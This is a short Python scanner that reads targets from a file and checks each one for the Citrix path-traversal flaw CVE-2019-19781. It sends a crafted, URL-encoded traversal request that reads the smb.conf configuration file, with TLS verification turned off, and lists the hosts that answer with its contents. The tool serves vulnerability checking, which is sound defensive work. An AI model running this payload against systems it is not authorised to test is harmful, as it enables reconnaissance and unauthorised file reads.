import requests
import format

Servers = []


def Submit(url):
    with requests.Session() as s:
        r = requests.Request(method='GET', url=url)
        prep = r.prepare()
        prep.url = url
        return s.send(prep, verify=False, timeout=2)


def Scan(ip, port):
    try:
        print("Scanning for CVE-2019-19781 on: %s        " % ip, end="\r")  # Cleaning up output a little
        if port == "80":
            url = ("http://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (ip, port))
            req = Submit(url)

        else:
            url = ("https://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (ip, port))
            req = Submit(url)

        if "[global]" in str(req.content) and "encrypt passwords" in str(req.content) and (
                "name resolve order") in str(req.content):
            print("Server: %s is still vulnerable to CVE-2019-19781." % ip)
            Servers.append(ip)
            return 1

        elif "Citrix" in str(req.content) or "403" in str(req.status_code):
            print(
                "Server: %s is not vulnerable." % (ip))

    except requests.ReadTimeout:
        pass

    except requests.ConnectTimeout:
        pass
    except requests.ConnectionError:
        pass


def run(filename):
    a = format.Format()
    a.ImportTargetFromFile(filename)
    target_list = a.GetTarget()
    for target in target_list:
        ip = target[0]
        port = target[1]
        Scan(ip, port)


if __name__ == '__main__':
    run('test.txt')
    for item in Servers:
        print(item + '\n')
